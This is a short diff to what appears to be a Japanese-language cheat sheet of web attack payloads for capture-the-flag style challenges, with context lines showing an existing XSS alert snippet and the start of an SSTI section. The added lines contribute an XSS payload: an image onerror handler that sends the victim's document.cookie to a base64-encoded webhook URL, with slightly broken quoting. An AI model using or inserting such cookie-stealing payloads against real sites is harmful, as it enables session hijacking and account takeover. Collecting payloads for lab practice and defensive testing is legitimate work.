@@ -6,6 +6,9 @@
   alert(document.cookies);
 </script>
 ```
+```html:XSS
+&lt;img src=x onerror=fetch(atob('webhookURL(btoa)')+?cookie='+document.cookie)&gt;
+```
 ## SSTI:
 問題にどこにファイルがあるかわからない時には
 ```Python:SSTI_ls
